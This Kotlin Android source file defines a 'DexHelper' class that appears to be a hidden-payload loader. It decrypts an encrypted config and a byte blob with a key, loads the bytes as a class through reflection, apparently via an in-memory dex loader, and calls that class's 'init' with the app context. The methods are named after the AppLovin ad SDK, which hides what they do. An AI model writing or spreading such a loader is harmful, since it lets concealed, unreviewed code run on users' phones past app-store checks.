package com.whisper.gentle

import android.content.Context
import com.whisper.gentle.core.InitSdk

/**
 * Date：2025/11/18
 * Describe:
 */
fun String.toClass(): Class<*> {
    return Class.forName(this)
}

class DexHelper {
    lateinit var m: InitSdk

    fun a(context: Context, str: String) {
        //345nuiizkjgasd12
        val key = m.key
        m.mContext = context
        m.initJson(String(mInfoD(key.toByteArray(), str)))
        appLovin(context, m.fetchKey())
    }

    private fun appLovin(context: Context, key: String) {
        val byte = m.appLov(key.toByteArray(), "aaa")
        val byteBufr = "java.nio.ByteBuffer".toClass()
//         2. 获取 wrap 方法
        val wrapMethod = byteBufr.getMethod("wrap", ByteArray::class.java)
//         3. 调用静态方法
        val byteBuffer = wrapMethod.invoke(null, byte)
        val clz = m.appLovinAction(byteBuffer)
        if (clz is Class<*>) {
            clz.getMethod("init", Context::class.java)?.invoke(null, context)
        }
    }

    private fun mInfoD(keyAes: ByteArray, inStr: String): ByteArray {
        return m.appLov(keyAes, inStr)
    }

}